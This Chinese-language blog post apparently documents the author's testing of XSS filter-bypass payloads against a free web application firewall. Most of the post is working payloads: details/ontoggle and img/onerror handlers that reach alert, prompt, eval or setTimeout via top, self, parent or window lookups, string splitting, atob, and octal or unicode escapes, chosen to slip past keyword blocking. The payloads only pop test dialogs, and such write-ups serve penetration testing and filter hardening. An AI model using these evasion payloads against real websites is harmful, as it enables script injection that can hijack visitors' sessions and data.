## 前言
- - -
对于我这个菜鸟来说，我通过谷歌百度学习到很多前辈的资料，甚至每句话都是他的指导，我也很感激前辈的为我们铺设的道路，让我们更快的成长起来。我也乐于分享，可能有些知识点过于单调或者久远，请见谅。

## waf
- - -
前几天花了10买了一个月的服务器，换个waf来测试。
![1](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xeuqs6nwj30g60cgdge.jpg)   

### Test

遗漏标签就不测试了，上一篇[水文](https://www.anquanke.com/post/id/176185)的分享的标签也可以过，不信找几个试试= =

好吧非常打脸，拦截了。

![2](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xf5z6pwcj30uj0590t6.jpg)

然而换个prompt()函数???免费版当然是这样的啦，高级服务不仅我买不起，还绕不过啊，而且我不是真正的站长，规则我也不会设啊，总之就是这也不会那也不会。

![3](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xf9uioa9j30uj094wf8.jpg)

![4](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xff076fvj30c80c874l.jpg)

### Top属性类似的补充
- - -
还记得上篇的top属性嘛

![5](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xfxfayjoj30kg04ot8n.jpg)

实际上可以利用的还有好几个，看到这里各位是否get到什么了。

![6](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xju6slwuj30ub06raac.jpg)

我们可以利用的类似拼接的对象又多了几个，例如：
```
//一家人就是要整整齐齐
<details open ontoggle=top['al'%2B'ert'](1) >
<details open ontoggle=self['al'%2B'ert'](1) >
<details open ontoggle=parent['al'%2B'ert'](1) >
<details open ontoggle=frames['al'%2B'ert'](1) >
<details open ontoggle=content['al'%2B'ert'](1) >
<details open ontoggle=window['al'%2B'ert'](1) >
```
这些都可以绕过waf，总结起来有 `top` `self` `parent` `frames` `content` `window`，无疑`top`是最短的，所谓短小精悍，这里借用PKAV的一张ppt。

![7](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xkryc227j30fp073782.jpg)

### 俩个例子
- - -
**例1**
```html
<img src=1 alt=al lang=ert onerror=top[alt%2blang](0)>
```
这个例子很巧妙，将`alt`和`lang`属性分别赋值合并起来就是`alert`，并在top属性内将2个属性相加。


**例2**
```html
 <details open ontoggle=top[a='al',b='ev',b%2ba]('alert(1)')>
```
在top属性内添加2个变量，并赋值构造eval，然后执行alert(1)

测试下，拦截了。
![8](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xodipv2ej30uj05hmxm.jpg)

其实waf，拦截的是alert这个关键字，换个`prompt()`函数就过了

![9](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xoh9uty6j30uj086q3n.jpg)

也可以选择将`alert(1)`编码，因为有eval存在啊，直接拿来用

```
<details open ontoggle=top[a='al',b='ev',b%2ba](atob('YWxlcnQoMSk='))>
<details open ontoggle=top[a='al',b='ev',b%2ba]('\141\154\145\162\164\50\61\51')>
<details open ontoggle=top[a='al',b='ev',b%2ba]('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')>
```

![10](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xom9zf77j30uj097mxz.jpg)

setTimeout()函数也是没问题的，毕竟也能执行代码。
```
<details open ontoggle=top[a='meout',b='setTi',b%2ba]('\141\154\145\162\164\50\61\51')>
```


